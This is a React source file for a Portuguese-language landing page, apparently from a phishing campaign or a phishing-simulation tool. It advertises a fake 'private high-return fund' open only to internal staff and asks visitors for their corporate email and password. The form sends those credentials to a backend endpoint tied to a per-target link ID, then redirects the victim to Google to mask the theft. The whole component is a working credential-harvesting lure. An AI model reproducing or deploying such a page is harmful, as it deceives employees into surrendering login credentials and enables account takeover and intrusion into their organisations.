import React, { useState } from 'react';
import './investimento.css';

const InvestimentoLanding = ({ linkId }) => {
  const [formData, setFormData] = useState({ email: '', password: '' });

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/landing/submit/${linkId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        window.location.href = 'https://www.google.com';
      } else {
        console.error('Erro ao enviar');
      }
    } catch (error) {
      console.error('Erro ao submeter:', error);
    }
  };

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  return (
    <div className="investment-container">
      <div className="investment-card">
        <h1>Fundo Privado de Alta Rentabilidade</h1>
        <p>Vagas limitadas para colaboradores internos! Retorno de até 18% a.a.</p>
        <form onSubmit={handleSubmit}>
          <input
            type="email"
            name="email"
            placeholder="Email corporativo"
            value={formData.email}
            onChange={handleChange}
            required
          />
          <input
            type="password"
            name="password"
            placeholder="Senha de acesso"
            value={formData.password}
            onChange={handleChange}
            required
          />
          <button type="submit">Acessar Proposta</button>
        </form>
      </div>
    </div>
  );
};

export default InvestimentoLanding;
